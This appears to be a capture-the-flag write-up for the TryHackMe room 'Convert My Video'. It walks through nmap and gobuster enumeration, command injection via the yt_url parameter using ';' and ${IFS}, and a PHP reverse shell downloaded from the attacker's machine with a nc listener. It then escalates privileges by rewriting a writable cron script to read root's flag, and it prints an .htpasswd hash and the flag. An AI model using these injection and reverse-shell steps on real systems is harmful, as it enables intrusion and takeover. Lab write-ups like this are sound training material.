---
title: TryHackMe - Convert My Video
date: 2022-11-28 16:35:00 +0530
categories: [TryHackMe]
tags: [tryhackme, Medium]
---

-------

Room : https://tryhackme.com/room/convertmyvideo

Difficulty : Medium

As always, starting off the test with adding the machine IP to /etc/hosts as **convert.thm**.


> You can convert your videos - Why don't you check it out!

## Enumeration

Start the testing with adding the machine IP to `/etc/hosts`.

### Nmap
```
$ sudo nmap -Pn convert.thm                      
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-26 05:02 EST
Nmap scan report for convert.thm (10.10.96.2)
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

$ sudo nmap -sC -sV -Pn -p22,80 convert.thm
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-26 05:03 EST
Nmap scan report for convert.thm (10.10.96.2)
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 651bfc741039dfddd02df0531ceb6dec (RSA)
|   256 c42804a5c3b96a955a4d7a6e46e214db (ECDSA)
|_  256 ba07bbcd424af293d105d0b34cb1d9b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster

Directory busting with **gobuster** using wordlists from `Seclists`.

```console
$ gobuster dir -u http://convert.thm -w ~/Github/SecLists/Discovery/Web-Content/apache.txt
# SNIPPED
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/tmp                  (Status: 301) [Size: 308] [--> http://convert.thm/tmp/]
# from another wordlist
/admin
```

![convert pic](/assets/img/thm_convert/1.png)

+ Web application which takes youtube video url as input (Video ID) and converts the video to audio and places it in /tmp.

### Burpsuite

Lets capture the request with **Burpsuite** and modify the _yt_url_ parameter with a delimiter `;`

![convert pic](/assets/img/thm_convert/2.png)

From the response, there are few points to note.
+ _yt_url_ value is being used to construct command something like `youtube-dl [yt_url] -f ..`
+ since we used `;` as input, `youtube-dl` and `-f` got separated and `sh` was executing `-f`. This is why we got part of the response as `sh 1: -f: not found.`

Let's try to inject some shell commands now.

![convert pic](/assets/img/thm_convert/3.png)

> yt_url=;whoami;   and the response is www-data
{: .prompt-info }

This is fine. but later i came across the problem where, commands with **space** wont get executed. they got cut off. Let's use **${IFS}** as substitution for *space*. 

> yt_url=;ls${IFS}-al;
> /var/www/

## Initial Shell

![convert pic](/assets/img/thm_convert/4.png)

So, we are currently having a execution at `/var/www/html` as **www-data**. Let us try to get a reverse shell by using php-reverse shell. we will be serving the reverse-shell to *convert.thm* using `python -m http.server` on our machine.

we can download the reverse shell on *convert.thm* using **wget**.

![convert pic](/assets/img/thm_convert/5.png)

Spawn a nc listener. 
`nc -lnvp 1234`

Now, browse to `http://convert.thm/php-reverse-shell.php` to execute this reverse shell php script.

![convert pic](/assets/img/thm_convert/6.png)

we can upgrade our shell to interactive using python script `python -c 'import pty;pty.spawn("/bin/bash")'`

Lets check the folders.

```console
$ cd /var/ww/html
$ dir
-f  admin  images  index.php  js  php-reverse-shell.php  style.css  tmp
$ ls
```

Let's check some file contents.

```php
<?php
# <---snipped--->
{    
   $yt_url = explode(" ", $_POST["yt_url"])[0];
   $id = uniqid();
   $filename = $id.".%(ext)s";
   $template = '/var/www/html/tmp/downloads/'. $filename;
   $string = ('youtube-dl --extract-audio --audio-format mp3 ' . $yt_url . ' -f 18 -o ' . escapeshellarg($template));
# <---snipped--->
?>
```
{: file='/var/www/html/index.php'}

```php
<?php
  if (isset($_REQUEST['c'])) {
      system($_REQUEST['c']);
      echo "Done :)";
  }
?>

<a href="/admin/?c=rm -rf /var/www/html/tmp/downloads">
   <button>Clean Downloads</button>
```
{: file='/var/www/html/admin/index.php'}

```console
$ cat /var/www/html/admin/.htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```

## Privilege Escalation

Lets run **linpeas.sh**. It states that `/var/www/html/tmp/clean.sh` has been run recently and repeatedly and i have perms to edit it.

```console
$ cat clean.sh
rm -rf downloads
```

Now we can modify the shell script to run our code. Lets try to read the root flag.

```console
$ echo 'cat /root/root.txt > flag.txt' > clean.sh
# After sometime
$ dir
clean.sh flag.txt
$ cat flag.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```

There are many rabbit holes i fell into, where i wasted time.